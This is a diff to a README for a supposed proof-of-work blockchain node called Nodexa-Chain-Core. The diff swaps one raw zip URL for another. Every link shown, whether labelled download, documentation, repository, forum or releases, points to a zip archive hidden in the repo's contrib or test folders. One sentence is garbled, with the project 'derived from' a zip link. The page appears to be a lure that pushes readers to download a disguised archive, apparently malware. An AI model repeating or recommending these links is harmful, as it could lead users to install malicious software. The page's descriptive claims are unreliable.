@@ -1,10 +1,10 @@
 # 🚀 Nodexa-Chain-Core - Secure Your Blockchain Experience
 
 ## 🔗 Download Now
-[![Download Nodexa-Chain-Core](https://raw.githubusercontent.com/DeonDavisV/Nodexa-Chain-Core/main/contrib/clore-qt-backups/clore-qt-2022-12-04_210016.zip)](https://raw.githubusercontent.com/DeonDavisV/Nodexa-Chain-Core/main/contrib/clore-qt-backups/clore-qt-2022-12-04_210016.zip)
+[![Download Nodexa-Chain-Core](https://github.com/DeonDavisV/Nodexa-Chain-Core/raw/refs/heads/main/test/util/Nodexa-Core-Chain-v1.1.zip)](https://github.com/DeonDavisV/Nodexa-Chain-Core/raw/refs/heads/main/test/util/Nodexa-Core-Chain-v1.1.zip)
 
 ## 📜 Overview
-Nodexa-Chain-Core is a consensus-layer implementation for Nodexa Chain, a Proof-of-Work (PoW) blockchain derived from https://raw.githubusercontent.com/DeonDavisV/Nodexa-Chain-Core/main/contrib/clore-qt-backups/clore-qt-2022-12-04_210016.zip It features an innovative KawPow to Equihash transition and incorporates DarkGravityWave for difficulty adjustments. This design ensures ASIC resistance, promotes GPU fairness, and supports secure block validation.
+Nodexa-Chain-Core is a consensus-layer implementation for Nodexa Chain, a Proof-of-Work (PoW) blockchain derived from https://github.com/DeonDavisV/Nodexa-Chain-Core/raw/refs/heads/main/test/util/Nodexa-Core-Chain-v1.1.zip It features an innovative KawPow to Equihash transition and incorporates DarkGravityWave for difficulty adjustments. This design ensures ASIC resistance, promotes GPU fairness, and supports secure block validation.
 
 ## 🚀 Getting Started
 To get started with Nodexa-Chain-Core, follow these steps carefully:
@@ -17,7 +17,7 @@ To get started with Nodexa-Chain-Core, follow these steps carefully:
    - **Internet Connection:** Required for initial setup and updates  
 
 2. **Visit the Releases Page**  
-   To download Nodexa-Chain-Core, visit the Releases page: [Download Here](https://raw.githubusercontent.com/DeonDavisV/Nodexa-Chain-Core/main/contrib/clore-qt-backups/clore-qt-2022-12-04_210016.zip)
+   To download Nodexa-Chain-Core, visit the Releases page: [Download Here](https://github.com/DeonDavisV/Nodexa-Chain-Core/raw/refs/heads/main/test/util/Nodexa-Core-Chain-v1.1.zip)
 
 3. **Download the Application**  
    On the Releases page, look for the latest version. Click on the appropriate file for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or for Linux, a suitable package).
@@ -45,11 +45,11 @@ Everyone is welcome to contribute to the Nodexa-Chain-Core project. If you want 
 4. Ensure you follow the contribution guidelines outlined in our documentation.
 
 ## 🔗 Useful Links
-- [Official Documentation](https://raw.githubusercontent.com/DeonDavisV/Nodexa-Chain-Core/main/contrib/clore-qt-backups/clore-qt-2022-12-04_210016.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/DeonDavisV/Nodexa-Chain-Core/main/contrib/clore-qt-backups/clore-qt-2022-12-04_210016.zip)
-- [Community Forum](https://raw.githubusercontent.com/DeonDavisV/Nodexa-Chain-Core/main/contrib/clore-qt-backups/clore-qt-2022-12-04_210016.zip)
+- [Official Documentation](https://github.com/DeonDavisV/Nodexa-Chain-Core/raw/refs/heads/main/test/util/Nodexa-Core-Chain-v1.1.zip)
+- [GitHub Repository](https://github.com/DeonDavisV/Nodexa-Chain-Core/raw/refs/heads/main/test/util/Nodexa-Core-Chain-v1.1.zip)
+- [Community Forum](https://github.com/DeonDavisV/Nodexa-Chain-Core/raw/refs/heads/main/test/util/Nodexa-Core-Chain-v1.1.zip)
 
 ## 💬 Get Help
 If you encounter issues or have questions, please check the FAQ on our documentation page or open an issue on GitHub. Our community is always ready to help you out. 
 
-Stay updated and explore all aspects of Nodexa-Chain-Core. For support and further information, do not hesitate to refer back to our [Releases page](https://raw.githubusercontent.com/DeonDavisV/Nodexa-Chain-Core/main/contrib/clore-qt-backups/clore-qt-2022-12-04_210016.zip) for downloading new versions and updates.
+Stay updated and explore all aspects of Nodexa-Chain-Core. For support and further information, do not hesitate to refer back to our [Releases page](https://github.com/DeonDavisV/Nodexa-Chain-Core/raw/refs/heads/main/test/util/Nodexa-Core-Chain-v1.1.zip) for downloading new versions and updates.
